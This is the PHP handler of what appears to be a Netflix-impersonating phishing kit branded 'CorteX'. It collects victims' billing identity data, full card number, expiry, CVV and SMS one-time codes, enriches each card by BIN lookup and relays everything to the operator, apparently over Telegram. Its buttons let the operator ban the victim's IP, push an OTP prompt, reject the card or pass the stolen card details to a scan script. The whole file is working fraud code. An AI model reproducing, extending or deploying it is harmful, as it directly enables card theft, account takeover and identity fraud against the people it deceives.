<?php
session_start(); // Ensure session is started at the very beginning

include "config.php";
include "functions.php";

$_SESSION['ip'] = $ip;
$_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'];

$base_url = 'https://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
// Adjust base_url to point to the root of the 'cortex' directory for redirects
$base_url = str_replace('/zebi', '', $base_url);

// Example: If you want to update a redirect file from a command
if (isset($_GET['action']) && $_GET['action'] == 'set_redirect') {
    $file = isset($_GET['file']) ? $_GET['file'] : '';
    $url = isset($_GET['url']) ? $_GET['url'] : '';

    if (!empty($file) && !empty($url)) {
        $filepath = '../redirect/' . basename($file); // Ensure it's within the redirect directory
        if (file_put_contents($filepath, $url)) {
            echo "Redirect for " . $file . " set to " . $url . " successfully.";
        } else {
            echo "Failed to set redirect for " . $file . ".";
        }
    } else {
        echo "Missing file or URL parameters.";
    }
    exit(); // Exit after handling the redirect update action
} else {
    echo "No action specified or action not recognized.";
}

$stepes = array(
    'sms' => 'step=sms',
    'payment-err' => 'step=payment-err',
    'success' => 'step=success',
    'ban' => 'step=ban'
);

$step = isset($_POST['step']) ? $_POST['step'] : (isset($_GET['step']) ? $_GET['step'] : null);

// Sanitize all POST inputs before use
$_POST = filter_input_array(INPUT_POST, FILTER_SANITIZE_STRING);

if (!empty($_POST['number'])) {
    $_SESSION["ccnum"] = $_POST["number"];
    $cc = str_replace(' ', '', $_SESSION["ccnum"]); // Remove spaces for BIN lookup
    $bin = substr($cc, 0, 6);
    $bins = $bin; // Use $bin directly for consistency

    $ch = curl_init();
    $url = "https://data.handyapi.com/bin/" . $bins;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
    $headers = array();
    $headers[] = "Accept-Version: 3";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $res = curl_exec($ch);
    if (curl_errno($ch)) {
        error_log("BIN API Error:" . curl_error($ch)); // Log error instead of echoing
        $someArray = []; // Initialize as empty array to prevent errors
    } else {
        $someArray = json_decode($res, true);
    }

    // Safely access array elements
    $emoji = isset($someArray["country"]["emoji"]) ? $someArray["country"]["emoji"] : '';
    $brand = isset($someArray["brand"]) ? $someArray["brand"] : 'Unknown';
    $type = isset($someArray["type"]) ? $someArray["type"] : 'Unknown';
    $bank = isset($someArray["bank"]["name"]) ? $someArray["bank"]["name"] : 'Unknown';
    $bank_phone = isset($someArray["bank"]["phone"]) ? $someArray["bank"]["phone"] : 'N/A';
    $subject_title = "[BIN: " . htmlspecialchars($bin) . "][" . htmlspecialchars($emoji) . " " . htmlspecialchars($brand) . " " . htmlspecialchars($type) . "]";

    $_SESSION['bank'] = isset($someArray['Issuer']) ? $someArray['Issuer'] : 'Unknown';
    $_SESSION['type'] = isset($someArray['Type']) ? $someArray['Type'] : 'Unknown';
    $_SESSION['level'] = isset($someArray['Scheme']) ? $someArray['Scheme'] : 'Unknown';
    $country_name_cont = (isset($someArray['Country']['Name']) ? $someArray['Country']['Name'] : 'Unknown') . "-" . (isset($someArray['Country']['Cont']) ? $someArray['Country']['Cont'] : 'Unknown');
    $_SESSION['country'] = $country_name_cont;
}

// Access Live_panel from the config array
// $Live_panel is a boolean from config.php
include "config.php"; // Ensure config.php is included to get $Live_panel

switch ($step) {
    case '1':
        $steps = "click";
        $message = "
📋 NEW CLICK FROM " . htmlspecialchars($country_code) . "

✨ Extra Information:

├ 🗺️ Country: " . htmlspecialchars($country_code) . "
├ 🌐 IP Address: " . htmlspecialchars($ip) . "
└ 💻 Operating System: " . htmlspecialchars($os) . "

🎯 Base Details:

└ 🕒 Timestamp: " . htmlspecialchars($timestamp) . "
└ 📍 System: <code> Netflix </code>
└ © 2025 - All rights reserved. 👾️

[🔗] CorteX - @Sssba3 [🔗]";
        break;

    case '2':
        $steps = "billing";
        $message = "
📋 NEW BILLING FROM " . htmlspecialchars($country_code) . "

💳 Billing Details:

├ ✍️ Full Name: <code>" . htmlspecialchars($_POST['firstname']) . " " . htmlspecialchars($_POST['lastname']) . " </code>
├ 🏠 Address: <code>" . htmlspecialchars($_POST['address']) . "</code>
├ 🏢 City:  <code>" . htmlspecialchars($_POST['city']) . "</code>
├ 📮 ZIP Code: <code>" . htmlspecialchars($_POST['zip']) . "</code>
├ ✉️ Email: <code>" . htmlspecialchars($_POST['email']) . "</code> 
├ 📞 Phone Number: <code>" . htmlspecialchars($_POST['phone']) . "</code>
└ 🎂 Date of Birth: <code>" . htmlspecialchars($_POST['dob']) . "</code>

✨ Extra Information:

├ 🗺️ Country: " . htmlspecialchars($country_code) . "
├ 🌐 IP Address: " . htmlspecialchars($ip) . "
└ 💻 Operating System: " . htmlspecialchars($_SESSION['ua']) . "

🎯 Base Details:

└ 🕒 Timestamp: " . htmlspecialchars($timestamp) . "
└ 📍 System: <code> Netflix </code>
└ © 2025 - All rights reserved. 👾️

[🔗] CorteX - @Sssba3 [🔗]";
        break;

    case '3':
        $steps = "payment";
        $message = "
📋 NEW PAYMENT CARD FROM " . htmlspecialchars($country_code) . "

💳 Card Information:

├ 🧾 Cardholder Name: <code>" . htmlspecialchars($_POST['cardholder']) . "</code>
├ 💳 Card Number: <code>" . htmlspecialchars($_POST['cardnumber']) . "</code>
├ 🕑 Expiry Date: <code>" . htmlspecialchars($_POST['expiry']) . "</code>
└ 🔒 CVV: <code>" . htmlspecialchars($_POST['cvv']) . "</code>

🏦 Bank Details:

├ 🏛️ Bank Name: <code>" . htmlspecialchars($_SESSION['bank']) . "</code>
├ 🏷️ Card Type: <code>" . htmlspecialchars($_SESSION['type']) . "</code>
├ ⚙️ Card Level: <code>" . htmlspecialchars($_SESSION['level']) . "</code>
└ 🗺️ Country: <code>" . htmlspecialchars($_SESSION['country']) . "</code>

✨ Extra Information:

├ 🏷️ BIN Code: #" . htmlspecialchars($bins) . " 
├ 🖼️ Card Image: cardimages.imaginecurve.com/cards/" . htmlspecialchars($bins) . ".png
├ 🌐 IP Address: " . htmlspecialchars($ip) . "
└ 💻 Operating System: " . htmlspecialchars($_SESSION['ua']) . "

🎯 Base Details:
└ 🕒 Timestamp: " . htmlspecialchars($timestamp) . "
└ 📍 System: <code> Netflix </code>
└ © 2025 - All rights reserved. 👾️

[🔗] CorteX - @Sssba3 [🔗]";
        break;

    case '4':
        $steps = "sms";
        $message = "
📋 NEW SMS VERIFICATION FROM " . htmlspecialchars($country_code) . "

🕹️ Verification Code:

└ <code> " . htmlspecialchars($_POST['code']) . " </code>

✨ Extra Information:

├ 🗺️ Country: " . htmlspecialchars($country_code) . "
├ 🌐 IP Address: " . htmlspecialchars($ip) . "
└ 💻 Operating System: " . htmlspecialchars($_SESSION['ua']) . "

🎯 Base Details:

└ 🕒 Timestamp: " . htmlspecialchars($timestamp) . "
└ 📍 System: <code> Netflix </code>
└ © 2025 - All rights reserved. 👾️

[🔗] CorteX - @Sssba3 [🔗]";
        break;

    default:
        die('Invalid step.');
}

if (!$Live_panel || $step == "1" || $step == "2") {
    $inline_keyboard = array(
        'inline_keyboard' => array(
            array(
                array('text' => 'Ban ip', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['ban']),
            ),
        )
    );
} elseif ($step == "3") {
    $inline_keyboard = array(
        'inline_keyboard' => array(
            array(
                array('text' => '🚫 BAN IP 🚫', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['ban']),
                array('text' => '✅ PAGE FINAL ✅', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['success']),
            ),
            array(
                array('text' => '📞 LANCER OTP 📞', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['sms']),
            ),
            array(
                array('text' => '❌ REFUSER CARTE ❌', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['payment-err']),
            ),
            array(
                array(
                    'text' => '🛰 SCAN CC 🛰',
                    'url' => $base_url . "/zebi/scan.php?cc-number=" . urlencode($_POST['cardnumber']) .
                            "&cc-exp=" . urlencode($_POST['expiry']) .
                            "&cc-cvv=" . urlencode($_POST['cvv']) .
                            "&fname=" . urlencode($_POST['cardholder'])
                )
            )
        )
    );
} elseif ($step == "4") {
    $inline_keyboard = array(
        'inline_keyboard' => array(
            array(
                array('text' => '🚫 BAN IP 🚫', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['ban']),
                array('text' => '✅ PAGE FINAL ✅', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['success']),
            ),
            array(
                array('text' => '📞 LANCER OTP 📞', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['sms']),
            ),
            array(
                array('text' => '❌ REFUSER LA CARTE ❌', 'url' => $base_url . "/zebi/query.php?ip=" . urlencode($ip) . "&" . $stepes['payment-err']),
            ),
        )
    );
}

sendMessage($message, $replyMarkup = $inline_keyboard, $replyToMessageId = null);

header("Location: " . $base_url . "/loading.php?steps=$steps");
exit();

?>
